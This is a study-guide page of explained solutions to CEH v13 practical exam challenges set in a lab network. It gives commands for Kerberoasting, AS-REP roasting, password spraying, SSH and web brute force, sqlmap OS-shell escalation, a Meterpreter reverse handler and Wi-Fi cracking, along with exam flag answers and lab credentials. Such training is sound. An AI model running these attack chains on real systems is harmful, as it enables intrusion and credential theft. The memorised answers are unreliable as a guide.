---
layout: default
title: All Solutions (Explained)
parent: Challenges
nav_order: 1
description: "All 40 CEH v13 practical challenges — CEH.CYBERSPHERE exam pool (1–20, explained) plus legacy practice pool (21–40)."
---

# CEH.CYBERSPHERE — Full Solutions (Explained)

CEH v13 Practical — **CEH.CYBERSPHERE** enterprise scenario. Challenges in exam sequence (1 → 20), each with the *why* behind every step. Use <kbd>Ctrl</kbd>+<kbd>F</kbd> to jump to a challenge or tool.

**Target networks:** `10.22.99.0/24` · `172.16.32.0/24` · `10.100.50.0/24`
**Excluded hosts:** `.1` and `.2` on every subnet.
**Workstations:** EH-1 Parrot (`attacker` / `toor`) · EH-2 Windows 11 (`Admin` / `Pa$$w0rd`)
**Wordlists:** `~/Desktop/Wordlists/Usernames.txt` and `Passwords.txt` on EH-1.
**Pass mark:** 15 / 20 (150 pts) in 6 hours.

{: .warning }
> Answers below are from a live CEH.CYBERSPHERE pool. IPs, hostnames, and flag values **rotate per exam instance** — learn the method, don't memorize the string. Confirmed answers are marked ✅.

### How to read each challenge

Every solve is broken into the same blocks so you build a repeatable habit:

- **🎯 Goal** — the single skill the challenge is testing.
- **💡 How it works** — the concept, so you can improvise when the lab differs.
- **Steps** — copy-paste commands with the reason each one is run.
- **⚠️ Watch out** — the mistakes that eat exam time.

### The 6-hour game plan

1. **Recon first (30 min).** Sweep all three subnets once, save the output — you'll reference host roles for the whole exam.
   ```bash
   nmap -sn 10.22.99.0/24 172.16.32.0/24 10.100.50.0/24 -oA live-hosts
   nmap -sV -O -T4 -iL live-hosts.gnmap -oA services   # after trimming to live IPs
   ```
2. **Bank the easy points.** Challenges 1–4 are pure enumeration — no exploitation. Grab them before touching AD.
3. **Chain the AD box (5–7, 9).** One foothold on the domain feeds kerberoast, AS-REP roast, and PowerView rights abuse.
4. **Leave heavy web/crypto (12–14, 20) for a fresh mind.** They're the biggest time sinks.
5. **Screenshot every flag as you find it.** Format matters — a right answer in the wrong format scores zero.

[← Challenge index](./){: .btn .btn-outline }

---

#### Challenge 1: NetBIOS Computer Name {#challenge-1}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10-15 min
**Question:** Extensive scan of `10.22.99.101` to identify the NetBIOS computer name.
**Answer Format:** `AAAAAA` — ✅ **MSSSRV**

**🎯 Goal:** Read a host's SMB/NetBIOS identity — the fastest way to name a Windows box on a network.

**💡 How it works:** Windows advertises its machine name over NetBIOS (UDP 137) and SMB (TCP 445). Nmap's `nbstat` and `smb-os-discovery` scripts query those services and hand you the computer name, domain, and OS without any credentials.

**Steps:**
1. Fingerprint SMB + NetBIOS:
   ```bash
   nmap -sV -sC -p137,139,445 10.22.99.101
   nmap --script nbstat.nse -sU -p137 10.22.99.101
   ```
   `-sC` runs the default scripts (incl. `smb-os-discovery`); `-sU -p137` hits the NetBIOS name service directly.
2. Cleaner one-liner if 445 is open:
   ```bash
   nmap --script smb-os-discovery -p445 10.22.99.101
   ```
3. Read the **NetBIOS computer name** / `Computer name:` field → `MSSSRV`.
4. No-nmap fallback: `nmblookup -A 10.22.99.101` → the `<20>` UNIQUE entry is the machine name.

**⚠️ Watch out:** The FQDN (`MSSSRV.ceh.cybersphere.com`) is not the answer here — the format `AAAAAA` wants the short NetBIOS name only. Strip the domain suffix.

---

#### Challenge 2: MSSQL Build Version on the Domain Controller {#challenge-2}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10 min
**Question:** Identify the AD Domain Controller in the target network and get the full build version of its MSSQL instance.
**Answer Format:** `NN.NN.NNNN.NN` — ✅ **16.00.1000.00**

**🎯 Goal:** Locate the DC by its service fingerprint, then version-grab a database service running on it.

**💡 How it works:** A Domain Controller lights up a signature port set — Kerberos (88), LDAP (389/636), SMB (445), plus DNS (53). MSSQL listens on 1433; Nmap's `ms-sql-info` script talks the TDS protocol and returns the exact server build.

**Steps:**
1. Find the DC — the host answering on the AD signature ports *and* 1433:
   ```bash
   nmap -p88,389,445,636,1433 --open 10.22.99.0/24
   ```
2. Version-grab the SQL Server:
   ```bash
   nmap -sV -p1433 --script ms-sql-info,ms-sql-ntlm-info <DC_IP>
   ```
3. Read the **version / build** → `16.00.1000.00` (that build = SQL Server 2022 RTM).

**⚠️ Watch out:** `-sV` alone may report a marketing name ("Microsoft SQL Server 2022"). The exam wants the **build number** — that only comes from `ms-sql-info`. Match the `NN.NN.NNNN.NN` format exactly, leading zeros included.

---

#### Challenge 3: SMTP Host — Subject Alternative Name {#challenge-3}
**Domain:** 1 — Network Scanning | **Difficulty:** Medium | **Time:** 15 min
**Question:** From `ipprotocols.txt` (EH-1 Downloads), find the machine running SMTP and its certificate Subject Alternative Name.
**Answer Format:** `AAA*aaaaaa` — ✅ **DNS:ubuntu**

**🎯 Goal:** Scan a supplied host list for a specific service, then pull a field out of its TLS certificate.

**💡 How it works:** SMTP runs on 25/465/587. Even plain SMTP offers STARTTLS, so a certificate is presented. The **Subject Alternative Name (SAN)** lists the hostnames the cert is valid for — here it's `DNS:ubuntu`.

**Steps:**
1. Scan every IP in the file for mail ports:
   ```bash
   nmap -iL ~/Downloads/ipprotocols.txt -p25,465,587 --open -sV
   ```
   `-iL` reads targets from the file so you don't type them by hand.
2. Pull the cert SAN from the SMTP host:
   ```bash
   nmap --script ssl-cert -p25 <SMTP_HOST>
   # or, read the full cert:
   openssl s_client -connect <SMTP_HOST>:25 -starttls smtp </dev/null 2>/dev/null \
     | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
   ```
3. Read the SAN → `DNS:ubuntu`.

**⚠️ Watch out:** Include the `DNS:` prefix — the format `AAA:aaaaaa` expects it. Don't confuse SAN with the certificate **Subject CN**; they can differ.

---

#### Challenge 4: PE Header — Loader Flags Description {#challenge-4}
**Domain:** 4 — Malware / Reverse Engineering | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** A malicious exe disguised as an image sits in the Downloads folder of an RDP-enabled Windows 11 host in `10.22.99.0/24`. Find the description of the **Loader Flags** field in the PE header.
**Answer Format:** `Aaaaaaaa` — ✅ **Obsolete**

**🎯 Goal:** Static-analyse a Windows executable and read a specific field from its PE Optional Header.

**💡 How it works:** Every Windows `.exe` starts with a PE (Portable Executable) header. Inside the *Optional Header* sits `LoaderFlags` — a legacy DWORD the loader no longer uses. Its documented meaning is literally **Obsolete**. A file renamed `.jpg` but starting with the `MZ` magic bytes is a PE, not an image.

**Steps:**
1. Find the RDP host and connect:
   ```bash
   nmap -p3389 --open 10.22.99.0/24
   xfreerdp /u:Admin /p:'Pa$$w0rd' /v:<HOST> /cert:ignore
   ```
2. Confirm the fake image is really a PE: `file suspicious.jpg` → reports `PE32 executable`.
3. Open it in **PE-bear / CFF Explorer / Detect It Easy** → **Optional Header**.
4. Hover / read the **Loader Flags** field description → **Obsolete**.

**⚠️ Watch out:** Don't report the field's *value* (`0x00000000`) — the question asks for its **description**. Any PE tool shows the same text; DIE and PE-bear ship on the exam workstations.

---

#### Challenge 5: Kerberoasting an SPN User {#challenge-5}
**Domain:** 2 — System Hacking (AD) | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Kerberoast an SPN user from the DC. Provide the **last four characters** of that account's password. Known creds: `Emily / T3chieT1g3r2024`.
**Answer Format:** `aaNN`

**🎯 Goal:** Abuse Kerberos to extract a crackable hash for any service account, then crack it offline.

**💡 How it works:** Any domain user can request a service ticket (TGS) for an account that has a Service Principal Name. That ticket is encrypted with the service account's NTLM hash — so you get an offline-crackable blob without touching the target service. Weak service-account passwords fall fast.

**Steps:**
1. Request TGS tickets for every SPN account using Emily's creds:
   ```bash
   impacket-GetUserSPNs CEH.CYBERSPHERE.com/Emily:'T3chieT1g3r2024' \
     -dc-ip <DC_IP> -request -outputfile kerb.hash
   ```
2. Crack the `$krb5tgs$` hash offline:
   ```bash
   hashcat -m 13100 kerb.hash ~/Desktop/Wordlists/Passwords.txt
   # or
   john --wordlist=~/Desktop/Wordlists/Passwords.txt kerb.hash
   ```
3. Cracked plaintext → take the **last 4 characters** = answer.

**⚠️ Watch out:** Kerberos is time-sensitive — if you get `KRB_AP_ERR_SKEW`, sync your clock to the DC: `sudo ntpdate <DC_IP>` (or `rdate`). Use the supplied `Passwords.txt` first; rockyou wastes time here.

---

#### Challenge 6: Password Spray → WriteDacl (PowerView) {#challenge-6}
**Domain:** 2 — System Hacking (AD) | **Difficulty:** Medium | **Time:** 20 min
**Question:** Using known password `H3l3n@444`, spray to get RDP access. Then with PowerView, find the user account that **Carlos** can manage via **WriteDacl** rights.
**Answer Format:** `Aaaaaa`

**🎯 Goal:** Two skills in one — spray a single password across many users, then map dangerous ACL rights inside AD.

**💡 How it works:** *Spraying* flips brute-force around: one password against many usernames, which dodges account lockout. Once inside, **WriteDacl** is a takeover primitive — whoever holds it over an object can rewrite that object's permissions and grant themselves full control. PowerView reads these ACLs from the domain.

**Steps:**
1. Spray one password across the user list (low-and-slow avoids lockout):
   ```bash
   crackmapexec smb 10.22.99.0/24 -u ~/Desktop/Wordlists/Usernames.txt \
     -p 'H3l3n@444' --continue-on-success
   ```
   A `[+]` line = a valid user/host pair. Note the host.
2. RDP in with the hit:
   ```bash
   xfreerdp /u:<valid_user> /p:'H3l3n@444' /v:<HOST> /cert:ignore +clipboard
   ```
3. In PowerShell, load PowerView and ask "what does Carlos hold WriteDacl over?":
   ```powershell
   Import-Module .\PowerView.ps1
   $carlos = Convert-NameToSid Carlos
   Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? {
     $_.SecurityIdentifier -eq $carlos -and $_.ActiveDirectoryRights -match 'WriteDacl'
   } | % { ConvertFrom-SID $_.ObjectSID }
   ```
   The resolved object name = the account Carlos can manage = answer.

**⚠️ Watch out:** Older PowerView uses `Get-ObjectAcl` (no `Domain`). You want the object *Carlos is the trustee over* (`SecurityIdentifier -eq $carlos`), not objects that have rights *over Carlos* — reversing this is the #1 mistake here.

---

#### Challenge 7: AS-REP Roast → Enable SSH → flag.txt {#challenge-7}
**Domain:** 2 — System Hacking (AD) | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** Client is AS-REP-roastable and already has a Meterpreter session on port **5555**. Crack the AS-REP hash, enable SSH, log in with the recovered creds, read `flag.txt`. Provide the **last six characters**.
**Answer Format:** `A**aNa`

**🎯 Goal:** Chain an AD credential attack into a post-exploitation pivot (turn on a service, then log in through it).

**💡 How it works:** Accounts with *"Do not require Kerberos pre-authentication"* set will hand the DC's AS-REP to anyone who asks — encrypted with the user's password hash, so it's crackable offline with no valid creds. Once cracked, you enable Windows OpenSSH from your existing Meterpreter foothold and log in as that user.

**Steps:**
1. Roast every pre-auth-disabled account (no password needed):
   ```bash
   impacket-GetNPUsers CEH.CYBERSPHERE.com/ -usersfile ~/Desktop/Wordlists/Usernames.txt \
     -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
   ```
2. Crack the `$krb5asrep$` hash:
   ```bash
   hashcat -m 18200 asrep.txt ~/Desktop/Wordlists/Passwords.txt
   ```
3. Reconnect the Meterpreter session and enable OpenSSH:
   ```
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set LPORT 5555
   run
   ```
   ```powershell
   Start-Service sshd
   Set-Service sshd -StartupType Automatic
   New-NetFirewallRule -Name sshd -DisplayName OpenSSH -Enabled True `
     -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
   ```
   (If `sshd` is missing: `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0`.)
4. Log in and grab the flag:
   ```bash
   ssh <cracked_user>@<HOST>
   where /r C:\ flag.txt   # locate it, then: type <path>\flag.txt
   ```
   Take the **last 6 characters** = answer.

**⚠️ Watch out:** If SSH refuses password login, the firewall rule or service didn't take — re-check `Get-Service sshd` and that port 22 is allowed. The flag may not be on the Desktop; search the whole drive.

---

#### Challenge 8: PCAP Credentials → Street Name {#challenge-8}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Medium | **Time:** 15 min
**Question:** `Secretive.pcap` under the admin profile at `10.22.99.170`. Find the creds used to log in to `www.filmfocuszone.com`, then provide the user's **street name** from the Address field.
**Answer Format:** `NNN Aaa`

**🎯 Goal:** Recover plaintext credentials and PII from captured HTTP traffic.

**💡 How it works:** Plain HTTP sends form fields in the clear. A login POST carries `username=`/`password=`; a registration or profile page carries the address. Following the TCP stream reassembles the full request/response so you can read it like a document.

**Steps:**
1. Pull the capture off the host (admin profile share):
   ```bash
   smbclient //10.22.99.170/C$ -U Admin    # or RDP in and copy it out
   ```
2. Extract the login POST:
   ```bash
   tshark -r Secretive.pcap -Y 'http.request.method=="POST"' -T fields -e http.file_data
   ```
   In Wireshark: filter `http.request.method == "POST"` → right-click → **Follow → HTTP Stream** → read `username=` / `password=`.
3. The address is often already in the capture (registration/profile load):
   ```bash
   tshark -r Secretive.pcap -Y http -T fields -e http.file_data | grep -iE 'address|street'
   ```
   If not, log in to the site with the creds → **My Account** → read the Address field → `NNN Aaa`.

**⚠️ Watch out:** Form data is URL-encoded — `%40` is `@`, `+` is a space. Decode before you read. The street *name* is just the number + name (e.g. `742 Elm`), not the whole address line.

---

#### Challenge 9: Crack SSH for Alex → Decode QR → URL {#challenge-9}
**Domain:** 2 / 4 — System Hacking + Crypto | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Crack SSH creds for user **Alex** on an Ubuntu host, retrieve and decode a QR code to reveal the website URL it contains.
**Answer Format:** `aaaa*aaa`

**🎯 Goal:** Online-brute a single SSH account, then extract data hidden in an image (QR).

**💡 How it works:** With a known username, Hydra tries passwords against the live SSH service until one authenticates. The payload — a QR image on the box — encodes a URL that a reader decodes back to text.

**Steps:**
1. Find the SSH host:
   ```bash
   nmap -p22 --open 10.22.99.0/24
   ```
2. Brute Alex's password (throttle threads so SSH doesn't drop you):
   ```bash
   hydra -l Alex -P ~/Desktop/Wordlists/Passwords.txt ssh://<HOST> -t4
   ```
3. Log in, find the QR image, copy it to EH-2:
   ```bash
   ssh Alex@<HOST>
   find / -iname '*.png' 2>/dev/null    # locate the QR, then scp it out
   ```
4. Decode with **QR Code Desktop Reader & Generator** (preinstalled on EH-2) → read the URL → `aaaa*aaa`.
   - CLI alternative on Parrot: `zbarimg qrcode.png`.

**⚠️ Watch out:** `-t4` (or lower) matters — too many parallel SSH attempts trigger `Connection reset` and you'll miss the valid password. The answer is the URL string inside the QR, not the image filename.

---

#### Challenge 10: DDoS PCAP — Attacker OS with Highest Burst Rate {#challenge-10}
**Domain:** 6 — Traffic Analysis | **Difficulty:** Hard | **Time:** 20-25 min
**Question:** From a DDoS `.pcap` in Boby's Downloads (Linux host, `10.22.99.0/24`), determine the OS of the botnet machine with the **highest burst rate**.
**Answer Format:** `Aaaaaa`

**🎯 Goal:** Identify the loudest attacker in a flood, then OS-fingerprint it passively.

**💡 How it works:** In a DDoS capture the top talker is the source sending the most packets/sec. You don't need active scanning to guess its OS — the IP **TTL** leaks it: stacks start TTL at a default (64 Linux, 128 Windows) and it only decreases in transit.

**Steps:**
1. Access Boby's host and pull the pcap (SSH/creds you've recovered elsewhere).
2. Find the top talker:
   ```bash
   tshark -r ddos.pcap -q -z conv,ip     # sort by packets/bytes
   ```
   GUI: Wireshark → **Statistics → Conversations → IPv4**, sort by packets.
3. Fingerprint that source's OS by TTL:
   ```bash
   tshark -r ddos.pcap -Y "ip.src==<TOP_IP>" -T fields -e ip.ttl | sort -u
   ```
   TTL ≈ 64 → **Linux**, ≈ 128 → **Windows**, ≈ 255 → Unix/network gear. Report the OS name → `Aaaaaa`.

**⚠️ Watch out:** "Highest burst rate" ≠ "most total packets" if bursts are short — check **IO Graphs** (Statistics → I/O Graph) per source if two are close. A TTL of 128 seen as 122 just means 6 hops of transit; round up to the nearest default.

---

#### Challenge 11: Honeypot Assessment → imhere.txt {#challenge-11}
**Domain:** 3 — Web / Exploitation | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Assess `172.16.32.210` (suspected honeypot). Find vulns, gain access, locate `imhere.txt`. Provide the **last five characters** of its content.
**Answer Format:** `ANaNa`

**🎯 Goal:** Separate a real, exploitable service from honeypot noise, then get a shell and read a file.

**💡 How it works:** Honeypots deliberately expose many fake services to bait attackers. A full scan tells you what's *listening*; the trick is finding the one service that's genuinely vulnerable (default creds, a known CVE, an exposed web path) rather than a decoy that just accepts connections.

**Steps:**
1. Full TCP scan with versions/scripts:
   ```bash
   nmap -sV -sC -p- 172.16.32.210
   ```
2. Enumerate the promising service — web dirs, default creds, known-CVE checks:
   ```bash
   gobuster dir -u http://172.16.32.210 -w /usr/share/wordlists/dirb/common.txt
   searchsploit <service> <version>
   ```
3. Exploit → get a shell → hunt the file:
   ```bash
   find / -name imhere.txt 2>/dev/null
   cat <path>/imhere.txt
   ```
4. Take the **last 5 characters** → answer.

**⚠️ Watch out:** Honeypots often show impossibly many open ports with generic banners — don't rabbit-hole on decoys. The service with a real, matching exploit is your way in.

---

#### Challenge 12: Web Exploit → Decrypt VeraCrypt Image {#challenge-12}
**Domain:** 4 — Cryptography | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** Exploit the web server, reach the upload directory holding a **VeraCrypt** image, decrypt it. Provide the **last four characters** of the extracted content.
**Answer Format:** `NA*N`

**🎯 Goal:** Exfiltrate an encrypted container over a web foothold, then crack and mount it.

**💡 How it works:** A VeraCrypt volume is an opaque encrypted blob — no header magic, no filenames — until you supply the passphrase, which derives the key. `veracrypt2john` extracts a crackable representation so Hashcat can brute the passphrase offline; then VeraCrypt mounts the volume as a normal drive.

**Steps:**
1. Enumerate the web app, find the upload dir, download the `.hc` container.
2. Extract a hash and crack the passphrase (the mode depends on the volume's hash algo):
   ```bash
   veracrypt2john volume.hc > vc.hash
   hashcat -m 13721 vc.hash ~/Desktop/Wordlists/Passwords.txt   # try 13721/13722/13723
   ```
3. Mount with the recovered passphrase:
   ```bash
   veracrypt --text --mount volume.hc /mnt/vc   # or the VeraCrypt GUI
   ```
4. Read the decrypted file → **last 4 characters** = answer.

**⚠️ Watch out:** VeraCrypt cracking is slow — start it early and let it run while you solve other challenges. If `-m 13721` finds nothing, the volume uses a different PRF; cycle the modes rather than assuming a wrong password.

---

#### Challenge 13: Exploit CEH Website → Employee Details File {#challenge-13}
**Domain:** 3 — Web Hacking | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** Exploit the CEH website at `172.16.32.252`, retrieve the employee-details file from the Downloads folder. Provide the **file name**.
**Answer Format:** `ANaaaaaaaa`

**🎯 Goal:** Turn a web vulnerability into file access on the hosting machine.

**💡 How it works:** Web apps expose a handful of high-yield flaws — SQLi, unrestricted upload, LFI/RCE, or a known-CVE component. Any of them can be leveraged to read or list files on the server. You don't need the file's contents here, only its name — so a directory listing is enough.

**Steps:**
1. Enumerate the stack and surface:
   ```bash
   whatweb http://172.16.32.252
   gobuster dir -u http://172.16.32.252 -w /usr/share/wordlists/dirb/common.txt
   nikto -h http://172.16.32.252
   ```
2. Exploit the flaw you found (SQLi / upload / RCE / CVE) to reach the filesystem.
3. List the Downloads folder:
   ```bash
   dir C:\Users\*\Downloads      # Windows target
   ls -la ~/Downloads            # Linux target
   ```
4. Report the employee file's **name** → `ANaaaaaaaa`.

**⚠️ Watch out:** The format `ANaaaaaaaa` (letter, digit, then lowercase) is a strong hint at the exact filename shape — use it to confirm you've found the right file, and include the extension only if the format implies it.

---

#### Challenge 14: SQLi → OS-Shell → Wrap.txt {#challenge-14}
**Domain:** 3 — Web Hacking | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** SQL-inject `filmfocuszone.com`, obtain an **OS-Shell** on the hosting machine, read `C:\Windows\system32\Trigger\Wrap.txt`. Provide the **last five characters**. Note: an encoded cookie hash of the site is stored on EH-2.
**Answer Format:** `A****`

**🎯 Goal:** Escalate SQL injection from data theft to operating-system command execution.

**💡 How it works:** On MSSQL, sqlmap's `--os-shell` abuses `xp_cmdshell` (or writes a web shell) to run OS commands through the injection point. The site gates the injectable page behind a session cookie — decoding the stored cookie from EH-2 gives you the authenticated context sqlmap needs.

**Steps:**
1. Grab the encoded cookie from EH-2 and decode it:
   ```bash
   echo '<encoded_cookie>' | base64 -d
   ```
2. Drive sqlmap into an OS shell with that session:
   ```bash
   sqlmap -u "http://filmfocuszone.com/<injectable>" \
     --cookie="<decoded_cookie>" --batch --os-shell
   ```
3. In the OS-shell, read the file:
   ```
   type C:\Windows\system32\Trigger\Wrap.txt
   ```
4. Take the **last 5 characters** → answer.

**⚠️ Watch out:** `--os-shell` needs stacked queries and often DBA privileges — if it fails, confirm the injection is on MSSQL and try `--technique=S`. Make sure the decoded cookie is *current*; an expired session gives sqlmap nothing to inject into.

---

#### Challenge 15: Crack Charley's Account Password {#challenge-15}
**Domain:** 3 / 4 — Web + Crypto | **Difficulty:** Medium | **Time:** 15 min
**Question:** On `www.smartshopperway.com`, crack user **Charley**'s account password.
**Answer Format:** `Aaaaaaaa`

**🎯 Goal:** Brute a web login form (or a recovered hash) for one known user.

**💡 How it works:** Hydra's `http-post-form` module replays the login POST with each candidate password and detects failure by a marker string in the response. If instead you recover a stored hash, you identify its type and crack it offline.

**Steps:**
1. Capture the login request (browser DevTools → Network) to get the exact field names + failure text.
2. Brute the account:
   ```bash
   hydra -l Charley -P ~/Desktop/Wordlists/Passwords.txt <HOST> http-post-form \
     "/login.php:username=^USER^&password=^PASS^:F=incorrect"
   ```
   Replace the path, field names, and `F=` failure string with the real ones.
3. If you pulled a hash instead: `hashid <hash>` → `hashcat`/`john` with the right mode.
4. The cracked plaintext → answer.

**⚠️ Watch out:** The `F=` marker must be text that appears **only on failed** logins — pick it wrong and Hydra reports every attempt as success (or none). Verify the form's real field names; guessing `user`/`pass` when it's `email`/`pwd` fails silently.

---

#### Challenge 16: Android — Pico TTS Package Name {#challenge-16}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Medium | **Time:** 15 min
**Question:** On a compromised Android device, enumerate installed apps and find the **package name** of the Pico TTS Service.
**Answer Format:** `aaa*aaaa*aaaa` — typically **com.svox.pico**

**🎯 Goal:** Enumerate installed packages on an Android target over ADB.

**💡 How it works:** Android's package manager (`pm`) lists every installed app by its reverse-domain package id. Pico is Android's built-in text-to-speech engine; its package is `com.svox.pico`.

**Steps:**
1. Connect and confirm the device:
   ```bash
   adb connect <ANDROID_IP>:5555
   adb devices
   ```
2. List packages and filter:
   ```bash
   adb shell pm list packages | grep -i pico
   adb shell pm list packages | grep -i tts    # if 'pico' returns nothing
   ```
3. Read the id → **`com.svox.pico`** (matches format `aaa.aaaa.aaaa`).

**⚠️ Watch out:** `pm list packages` prefixes each line with `package:` — strip that. Answer the **package name**, not the app's display label ("Pico TTS").

---

#### Challenge 17: Crack Wi-Fi from wifimap.cap {#challenge-17}
**Domain:** 7 — Wireless | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** `wifimap.cap` (airodump-ng capture) is in EH-1 `Videos`. Crack the Wi-Fi password; provide the **first four characters**.
**Answer Format:** `aaaa`

**🎯 Goal:** Recover a WPA/WPA2 passphrase from a captured 4-way handshake.

**💡 How it works:** WPA2 never sends the password, but the 4-way handshake contains enough to verify a guess. `aircrack-ng` hashes each wordlist candidate with the captured handshake parameters and stops when the derived key matches.

**Steps:**
1. Confirm the capture holds a handshake and list BSSIDs:
   ```bash
   aircrack-ng ~/Videos/wifimap.cap
   ```
2. Crack against the supplied wordlist:
   ```bash
   aircrack-ng -w ~/Desktop/Wordlists/Passwords.txt -b <BSSID> ~/Videos/wifimap.cap
   ```
3. `KEY FOUND! [ <password> ]` → take the **first 4 characters** = answer.

**⚠️ Watch out:** No handshake in the capture = nothing to crack (aircrack prints "no valid WPA handshakes"). If multiple networks are present, target the right **BSSID** with `-b`. Use the exam wordlist first.

---

#### Challenge 18: Android — Decrypt BC_Enc.txt (Base64 key) {#challenge-18}
**Domain:** 5 / 4 — Mobile + Crypto | **Difficulty:** Medium | **Time:** 15 min
**Question:** Encrypted `BC_Enc.txt` is on an Android device; the decryption password is in EH-1 `Documents/B64.txt` (Base64). Decrypt and provide the **last 6 characters** of the plaintext.
**Answer Format:** `A*aAaa`

**🎯 Goal:** Decode a key from one host, pull ciphertext from another, and decrypt.

**💡 How it works:** The password is Base64-obfuscated (encoding, not encryption — trivially reversible). Once decoded, it unlocks `BC_Enc.txt`. The `BC_` prefix points at **BCTextEncoder** (a common CEH tool), which wraps text in an armored block decryptable with the passphrase.

**Steps:**
1. Decode the key:
   ```bash
   base64 -d ~/Documents/B64.txt
   ```
2. Pull the ciphertext off the device:
   ```bash
   adb pull /sdcard/.../BC_Enc.txt ./
   ```
3. Decrypt with the tool the file implies — BCTextEncoder (paste the block, enter the passphrase), or if it's raw OpenSSL/ccrypt output:
   ```bash
   openssl enc -d -aes-256-cbc -in BC_Enc.txt -out dec.txt -k '<decoded_password>'
   # or: ccrypt -d -K '<password>' BC_Enc.txt
   ```
4. Read the plaintext → **last 6 characters** = answer.

**⚠️ Watch out:** Don't try to "crack" the Base64 — it's just decoded. Match the decryptor to the file format: a `-----BEGIN ENCODED MESSAGE-----` block is BCTextEncoder, not OpenSSL.

---

#### Challenge 19: Docker Image with CVE-2019-13012 — Size {#challenge-19}
**Domain:** 5 — Container / Vuln Mgmt | **Difficulty:** Hard | **Time:** 20 min
**Question:** On EH-1, find the Docker image containing **CVE-2019-13012** and report its size in MB.
**Answer Format:** `NNN`

**🎯 Goal:** Scan local container images for a specific CVE and read the matching image's metadata.

**💡 How it works:** A vulnerability scanner (Trivy) inspects each image's package inventory against CVE databases. CVE-2019-13012 is a GLib `GKeyFile` file-permission flaw, so the vulnerable image ships an affected GLib. `docker images` already prints each image's size — you just need to know *which* image matches.

**Steps:**
1. List local images with sizes:
   ```bash
   docker images
   ```
2. Scan each image for the CVE:
   ```bash
   for i in $(docker images --format '{{.Repository}}:{{.Tag}}'); do
     trivy image -q "$i" | grep -q CVE-2019-13012 && echo "MATCH $i"
   done
   ```
3. For the matching image, read the **SIZE** column from `docker images` → `NNN` MB.

**⚠️ Watch out:** Report the size Docker shows (MB), rounding as the format `NNN` expects. If Trivy's DB isn't cached and there's no internet, scan the offline image DB or grep the image's package list for the vulnerable GLib version.

---

#### Challenge 20: Stego Password → Decrypt Doc → Latitude {#challenge-20}
**Domain:** 4 / 6 — Crypto + Forensics | **Difficulty:** Hard | **Time:** 25-30 min
**Question:** A hacker's info is encrypted on a target Ubuntu host. The decryption password hides in a **steganographic image** under user **Jack** on a Windows host (`10.22.99.0/24`). Decrypt the doc and provide the hacker's **latitude**.
**Answer Format:** `NN*NNNN`

**🎯 Goal:** Multi-host chain — extract a hidden passphrase via stego, then decrypt a document on a different machine.

**💡 How it works:** `steghide` embeds data inside an image's least-significant bits, protected by a passphrase. Extract it to recover the decryption password, carry that to the Ubuntu host, and decrypt the document (GPG/OpenSSL/zip depending on type) to read the coordinates.

**Steps:**
1. On Jack's Windows host, grab the stego image and extract the hidden password:
   ```bash
   steghide extract -sf image.jpg -p ''        # try blank / obvious passphrases first
   stegseek image.jpg ~/Desktop/Wordlists/Passwords.txt   # if it's passphrase-protected
   ```
2. On the Ubuntu host, decrypt the document with that password:
   ```bash
   gpg --batch --passphrase '<stego_pw>' -o doc.out -d document.gpg
   # or: openssl enc -d ...  /  unzip -P '<stego_pw>' doc.zip
   ```
3. Read the coordinates in the decrypted doc → report the **latitude** → `NN.NNNN`.

**⚠️ Watch out:** If `steghide` says "could not extract any data", the passphrase is wrong — `stegseek` brute-forces it fast against the wordlist. Report **latitude** (the `NN.NNNN` first coordinate), not longitude.

---
---

# Practice Pool — Legacy Challenges (21–40)

Earlier CEH v13 practical variants. IPs use `192.168.x` placeholders — swap for your live lab. Same skills, different flag rotation. Train these to build muscle memory, then run the CEH.CYBERSPHERE set above cold.

---

#### Challenge 21: Find Domain Controller DNS Name {#challenge-21}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10-15 min
**Question:** Conduct a comprehensive scan of the network to identify the DNS computer name of the Domain Controller.
**Answer Format:** AaaaaAaaa*AAAAAA*aaa (e.g., DOMAINCONTROLLER01)

**Solution:**
1. `nmap -A -T4 192.168.1.0/24`
2. Look for domain controller (ports 389/445/3389)
3. `nmap --script smb-os-discovery.nse -p445 [DC_IP]`
4. Extract the Computer name field

---

#### Challenge 22: Find IMAP Mercury Service Version {#challenge-22}
**Domain:** 1 — Network Scanning | **Difficulty:** Easy | **Time:** 10 min
**Question:** Identify the version of the IMAP Mercury service.
**Answer Format:** N.NN (e.g., 4.62)

**Solution:**
1. `nmap -A -T4 -p- 192.168.1.0/24`
2. Find port 143 (IMAP)
3. `nmap -sV -p 143 [HOST]`
4. Extract the version number

---

#### Challenge 23: SQL Injection — Extract Database {#challenge-23}
**Domain:** 3 — Web Hacking | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Use SQL injection to extract data from the victim database.
**Answer Format:** NaaAaa*aaa*aaaaa

**Solution:**
1. `sqlmap -u "http://192.168.1.5/page.php?id=1" -v`
2. `sqlmap -u "http://192.168.1.5/page.php?id=1" --dbs`
3. `sqlmap -u "http://192.168.1.5/page.php?id=1" -D dbname --tables`
4. `sqlmap -u "http://192.168.1.5/page.php?id=1" -D dbname -T users --dump`
5. Extract the answer from output

---

#### Challenge 24: Android Steganography {#challenge-24}
**Domain:** 5 — Mobile & IoT | **Difficulty:** Medium | **Time:** 15-20 min
**Question:** Extract the hidden data from IMG_20240621_143000.jpg on an Android device.
**Answer Format:** Variable (depends on hidden content)

**Solution:**
1. `adb connect 192.168.1.100:5555`
2. `adb shell ls /sdcard/DCIM/Camera/`
3. `adb pull /sdcard/DCIM/Camera/IMG_20240621_143000.jpg ./`
4. `steghide extract -sf IMG_20240621_143000.jpg -p ""`
5. `cat secret.txt`

